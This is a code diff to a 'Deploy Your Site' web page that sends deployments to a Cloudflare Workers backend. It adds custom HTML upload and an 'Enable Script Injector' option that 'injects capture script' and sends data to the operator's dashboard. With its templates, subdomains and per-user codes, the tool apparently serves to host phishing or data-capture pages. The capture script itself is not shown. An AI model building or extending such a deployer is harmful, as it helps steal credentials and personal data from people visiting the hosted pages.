@@ -20,18 +20,48 @@
         #message { margin-top: 20px; padding: 15px; border-radius: 6px; display: none; text-align: center; }
         .success { background: #d4edda; color: #155724; }
         .error { background: #f8d7da; color: #721c24; }
+
+        .hidden { display: none; }
+        .mode-switch { display: flex; gap: 10px; margin-bottom: 20px; }
+        .mode-btn { flex: 1; background: #f4f4f4; color: #333; border: 1px solid #ddd; padding: 12px; cursor: pointer; border-radius: 6px; font-weight: bold; }
+        .mode-btn.active { background: #0070f3; color: white; border-color: #0070f3; }
+        textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; font-family: monospace; resize: vertical; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🚀 Deploy Your Site</h1>
-        <p>Choose a template and launch instantly.</p>
+        <p>Choose a template or upload your own HTML.</p>
 
-        <div class="form-group">
+        <div class="mode-switch">
+            <button id="btn-mode-template" class="mode-btn active" onclick="setMode('template')">Use Template</button>
+            <button id="btn-mode-custom" class="mode-btn" onclick="setMode('custom')">Custom HTML</button>
+        </div>
+
+        <div id="section-template" class="form-group">
             <label>Choose Template</label>
             <select id="templateName">
                 <option value="">Loading templates...</option>
             </select>
+        </div>
+
+        <div id="section-custom" class="form-group hidden">
+            <label>Upload HTML File</label>
+            <input type="file" onchange="loadFile(this, 'customHtml')" accept=".html,.txt" style="margin-bottom: 10px;">
+
+            <label>Or Paste HTML Code</label>
+            <textarea id="customHtml" placeholder="<!DOCTYPE html><html>...</html>" style="height: 150px;"></textarea>
+
+            <div style="margin-top: 15px; background: #f8f9fa; padding: 15px; border-radius: 6px; border: 1px solid #eee;">
+                <label style="display:flex; align-items:center; cursor:pointer; margin-bottom: 0;">
+                    <input type="checkbox" id="enableInjector" style="width:auto; margin-right: 10px;">
+                    <span style="font-weight:bold;">Enable Script Injector</span>
+                </label>
+                <small style="color:#666; display:block; margin-top:5px; line-height: 1.4;">
+                    <strong>ON:</strong> Injects capture script. Data is sent to your dashboard.<br>
+                    <strong>OFF:</strong> Hosts static HTML only. No data capture.
+                </small>
+            </div>
         </div>
 
         <div class="form-group">
@@ -55,6 +85,28 @@
 
     <script>
         const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';
+        let currentMode = 'template';
+
+        function setMode(mode) {
+            currentMode = mode;
+            // Toggle Buttons
+            document.getElementById('btn-mode-template').classList.toggle('active', mode === 'template');
+            document.getElementById('btn-mode-custom').classList.toggle('active', mode === 'custom');
+
+            // Toggle Sections
+            document.getElementById('section-template').classList.toggle('hidden', mode !== 'template');
+            document.getElementById('section-custom').classList.toggle('hidden', mode !== 'custom');
+        }
+
+        function loadFile(input, targetId) {
+            const file = input.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                document.getElementById(targetId).value = e.target.result;
+            };
+            reader.readAsText(file);
+        }
 
         async function loadTemplates() {
             const select = document.getElementById('templateName');
@@ -91,14 +143,30 @@
         }
 
         async function deploy() {
-            const templateName = document.getElementById('templateName').value;
             const subdomain = document.getElementById('subdomain').value;
             const uniqueCode = document.getElementById('uniqueCode').value;
-            const btn = document.querySelector('button');
+            const btn = document.querySelector('button[onclick="deploy()"]');
 
-            if (!templateName || !subdomain || !uniqueCode) {
-                showMessage('Please fill in all fields.', 'error');
+            if (!subdomain || !uniqueCode) {
+                showMessage('Please fill in Subdomain and Unique Code.', 'error');
                 return;
+            }
+
+            const payload = { subdomain, uniqueCode };
+
+            if (currentMode === 'template') {
+                payload.templateName = document.getElementById('templateName').value;
+                if (!payload.templateName) {
+                    showMessage('Please select a template.', 'error');
+                    return;
+                }
+            } else {
+                payload.customHtml = document.getElementById('customHtml').value;
+                payload.enableInjector = document.getElementById('enableInjector').checked;
+                if (!payload.customHtml) {
+                    showMessage('Please provide HTML content.', 'error');
+                    return;
+                }
             }
 
             btn.innerText = 'Deploying...';
@@ -109,7 +177,7 @@
                 const res = await fetch(`${WORKER_URL}/api/public/deploy`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ templateName, subdomain, uniqueCode })
+                    body: JSON.stringify(payload)
                 });
                 const data = await res.json();
 
